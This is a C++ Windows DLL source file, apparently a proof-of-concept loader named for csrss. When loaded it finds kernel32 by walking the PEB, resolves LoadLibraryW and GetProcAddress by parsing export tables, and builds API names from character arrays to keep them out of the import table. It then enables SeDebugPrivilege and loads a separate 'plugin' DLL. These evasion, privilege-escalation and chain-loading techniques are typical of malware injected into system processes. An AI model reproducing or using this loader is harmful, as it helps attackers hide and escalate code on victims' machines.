// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "crt_string.h"

#ifndef DLLMAIN_H_
#define DLLMAIN_H_
//////////////////////////////////////////////////////////////////////////
#include <Windows.h>
#include <Winternl.h>
//////////////////////////////////////////////////////////////////////////
typedef ULONG(WINAPI *LPFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef BOOL(WINAPI *LPFN_DisableThreadLibraryCallsAPI)(HMODULE);
typedef BOOL(WINAPI *LPFN_Wow64DisableWow64FsRedirectionAPI)(PVOID*);
typedef FARPROC(WINAPI* LPFN_GetProcAddressAPI)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LPFN_LoadLibraryWAPI)(LPCWSTR);
typedef BOOL(WINAPI* LPFN_FreeLibraryAPI)(HMODULE);

LPFN_RtlAdjustPrivilege FN_RtlAdjustPrivilege = nullptr;
LPFN_DisableThreadLibraryCallsAPI FN_DisableThreadLibraryCallsAPI = nullptr;
LPFN_Wow64DisableWow64FsRedirectionAPI FN_Wow64DisableWow64FsRedirectionAPI = nullptr;
LPFN_GetProcAddressAPI FN_GetProcAddressAPI = nullptr;
LPFN_LoadLibraryWAPI FN_LoadLibraryWAPI = nullptr;
LPFN_FreeLibraryAPI FN_FreeLibraryAPI = nullptr;

//////////////////////////////////////////////////////////////////////////
#ifdef POC_CSRSS_EXPORTS
#define POC_CSRSS_API __declspec(dllexport)
#else
#define POC_CSRSS_API __declspec(dllimport)
#endif
//////////////////////////////////////////////////////////////////////////
#endif

namespace Function{
	HANDLE GetKernel32Handle(){
		HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#if defined(OS_WIN_64) || defined(_WIN64) || defined(WIN64)
		PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
		PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif
		PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY pListEntry = pListHead->Flink;
		WCHAR strDllName[MAX_PATH];
		WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

		while (pListEntry != pListHead){
			PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			if (pModEntry->FullDllName.Length){
				DWORD dwLen = pModEntry->FullDllName.Length;
				__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);
				strDllName[dwLen / sizeof(WCHAR)] = L'\0';
				if (__STRSTRIW__(strDllName, strKernel32)){
					hKernel32 = pModEntry->DllBase;
					break;
				}
			}
			pListEntry = pListEntry->Flink;
		}
		return hKernel32;
	}

	BOOL Initialize(){
		HANDLE hKernel32 = GetKernel32Handle();
		if (hKernel32 == INVALID_HANDLE_VALUE){
			return FALSE;
		}
		LPBYTE lpBaseAddr = (LPBYTE)hKernel32;
		PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
		PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfNames);
		LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);
		LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);
		CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };
		CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

		for (UINT i = 0; i < pExportDir->NumberOfNames; i++){
			LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
			if (!__STRCMPI__(pFuncName, strGetProcAddress)){
				FN_GetProcAddressAPI = (FARPROC(WINAPI*)(HMODULE, LPCSTR))(lpBaseAddr + pAddrArray[pOrdArray[i]]);
			}
			else if (!__STRCMPI__(pFuncName, strLoadLibraryA)){
				FN_LoadLibraryWAPI = (HMODULE(WINAPI*)(LPCWSTR))(lpBaseAddr + pAddrArray[pOrdArray[i]]);
			}
			if (FN_GetProcAddressAPI != nullptr && FN_LoadLibraryWAPI != nullptr){
				return TRUE;
			}
		}
		return FALSE;
	}
	FARPROC GetAddress(const char* function_name){
#if defined(OS_WIN_64) || defined(_WIN64) || defined(WIN64)
		PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
		PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif

		PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY pListEntry = pListHead->Flink;
		while (pListEntry != pListHead){
			PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			if (pModEntry->FullDllName.Length){
				FARPROC address = FN_GetProcAddressAPI(FN_LoadLibraryWAPI(pModEntry->FullDllName.Buffer), function_name);
				if (address){
					return address;
				}
			}
			pListEntry = pListEntry->Flink;
		}
		return nullptr;
	}
	bool ImportDll(){
		using OLE_INITIALIZE = HRESULT(WINAPI*)(LPVOID);
		wchar_t dll_ole32[] = { L'O', L'l', L'e', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
		char dll_ole32_api[] = { 'O', 'l', 'e', 'I', 'n', 'i', 't', 'i', 'a', 'l', 'i', 'z', 'e', 0 };
		OLE_INITIALIZE ole_initialize = reinterpret_cast<OLE_INITIALIZE>(FN_GetProcAddressAPI(FN_LoadLibraryWAPI(dll_ole32), dll_ole32_api));
		using INIT_COMMON_CONTROLS_EX = void (WINAPI*)(const void*);
		wchar_t dll_comctl32[] = { L'C', L'o', L'm', L'c', L't', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
		char dll_comctl32_api[] = { 'I', 'n', 'i', 't', 'C', 'o', 'm', 'm', 'o', 'n', 'C', 'o', 'n', 't', 'r', 'o', 'l', 's', 'E', 'x', 0 };
		INIT_COMMON_CONTROLS_EX init_common_controls_ex = reinterpret_cast<INIT_COMMON_CONTROLS_EX>(FN_GetProcAddressAPI(FN_LoadLibraryWAPI(dll_comctl32), dll_comctl32_api));
		if (ole_initialize == nullptr || init_common_controls_ex == nullptr){
			return false;
		}
		init_common_controls_ex(nullptr);
		return (ole_initialize(nullptr) == S_OK);
	}
	HMODULE LoadPluginEngine(HMODULE hModule, const wchar_t* name){
		typedef DWORD(WINAPI* LPFN_GetModuleFileNameWAPI)(HMODULE, LPWSTR, DWORD);
		typedef HRESULT(STDAPICALLTYPE* LPFN_PathRemoveFileSpecWPI)(LPWSTR);
		LPFN_GetModuleFileNameWAPI FN_GetModuleFileNameWAPI = nullptr;
		LPFN_PathRemoveFileSpecWPI FN_PathRemoveFileSpecWPI = nullptr;

		FN_GetModuleFileNameWAPI = (LPFN_GetModuleFileNameWAPI)Function::GetAddress("GetModuleFileNameW");		
		FN_PathRemoveFileSpecWPI = (LPFN_PathRemoveFileSpecWPI)Function::GetAddress("PathRemoveFileSpecW");
		if (FN_GetModuleFileNameWAPI != nullptr&&FN_PathRemoveFileSpecWPI != nullptr){
			wchar_t fileName[MAX_PATH];
			FN_GetModuleFileNameWAPI(hModule, fileName, MAX_PATH);
			FN_PathRemoveFileSpecWPI(fileName);
			__STRCATW__(fileName, (LPWSTR)name);
			return FN_LoadLibraryWAPI(fileName);
		}
		return nullptr;
	}
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	static HMODULE ldr = nullptr;
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		Function::Initialize();
		Function::ImportDll();
		if (FN_DisableThreadLibraryCallsAPI == nullptr)
		{
			FN_DisableThreadLibraryCallsAPI = (LPFN_DisableThreadLibraryCallsAPI)Function::GetAddress("DisableThreadLibraryCalls");
			FN_DisableThreadLibraryCallsAPI(hModule);
		}
		if (FN_RtlAdjustPrivilege == nullptr)
		{
			BOOLEAN enabled_privilege = 0;
			const DWORD SE_DEBUG_PRIVILEGE = 0x14;
			FN_RtlAdjustPrivilege = (LPFN_RtlAdjustPrivilege)Function::GetAddress("RtlAdjustPrivilege");
			FN_RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &enabled_privilege);
		}
		ldr = Function::LoadPluginEngine(hModule, PLUGIN_LDR_NAME);
		return (ldr != nullptr);
	}
	if (ul_reason_for_call == DLL_PROCESS_DETACH)
	{
		if (FN_FreeLibraryAPI == nullptr){
			FN_FreeLibraryAPI = (LPFN_FreeLibraryAPI)Function::GetAddress("FreeLibrary");
			return (FN_FreeLibraryAPI(ldr));
		}
	}
	return FALSE;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

